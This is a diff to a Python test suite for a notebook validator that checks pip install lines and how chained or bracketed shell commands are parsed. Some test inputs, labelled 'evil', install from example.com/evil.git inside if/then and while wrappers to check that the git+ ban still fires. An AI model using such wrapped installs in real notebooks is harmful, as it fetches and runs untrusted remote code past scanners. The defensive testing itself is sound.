@@ -781,9 +781,10 @@ def test_notebook_validator_unwraps_shell_groups():
             f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)
         ), evil
 
-    assert nv._unwrap_shell_group("!( pip install x )") == "!pip install x"
-    assert nv._unwrap_shell_group("{ pip install x") == "pip install x"
-    assert nv._unwrap_shell_group("}") == ""
+    assert nv._unwrap_shell_group("!( pip install x )") == ("!pip install x", False)
+    assert nv._unwrap_shell_group("{ pip install x") == ("pip install x", False)
+    assert nv._unwrap_shell_group("}") == ("", False)
+    assert nv._unwrap_shell_group("then pip install x") == ("pip install x", True)
 
 
 def test_notebook_validator_skips_conditional_invocations_in_rule_002(monkeypatch):
@@ -1264,6 +1265,45 @@ def test_notebook_validator_will_not_keep_a_version_through_an_upgrade():
         )
         == 1
     )
+
+
+def test_notebook_validator_keeps_the_flag_of_the_command_in_hand():
+    """A group's closing bracket ends the level, not the command being read: the install
+    before the `)` still belongs to the fallback the `||` opened."""
+    nv = _load_notebook_validator_module()
+
+    closing = '!(pip install foo || pip install "torch==2.12.0")'
+    assert [flag for _, flag in nv._split_chained(closing)] == [False, True]
+    assert nv.rule_inst_004_torchcodec_torch(closing, COLAB_TORCH211, "nb.ipynb", 0) == []
+
+    # The same list ending its tail at an `&&` is unchanged.
+    ended = '!(pip install foo || pip install bar && pip install "torch==2.12.0")'
+    assert [flag for _, flag in nv._split_chained(ended)] == [False, True, False]
+    assert len(nv.rule_inst_004_torchcodec_torch(ended, COLAB_TORCH211, "nb.ipynb", 0)) == 1
+
+
+def test_notebook_validator_reads_a_compound_only_line():
+    """With no standalone pip command on the line, every piece kept a keyword and none
+    parsed, so the git+ ban never looked. The body runs, but only if its test did."""
+    nv = _load_notebook_validator_module()
+
+    for evil in (
+        "!if command -v uv; then pip install git+https://example.com/evil.git; fi",
+        "!while true; do pip install git+https://example.com/evil.git; done",
+    ):
+        assert any(
+            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)
+        ), evil
+
+    # Conditional, so the version replay leaves it alone.
+    guarded = '!if command -v uv; then pip install "torch==2.12.0"; fi'
+    assert [flag for _, flag in nv._split_chained(guarded)] == [True, True]
+    assert nv.rule_inst_004_torchcodec_torch(guarded, COLAB_TORCH211, "nb.ipynb", 0) == []
+
+    # An unguarded install on its own line still counts.
+    assert len(nv.rule_inst_004_torchcodec_torch(
+        '!pip install "torch==2.12.0"', COLAB_TORCH211, "nb.ipynb", 0
+    )) == 1
 
 
 def test_notebook_validator_reads_a_range_as_one_window():
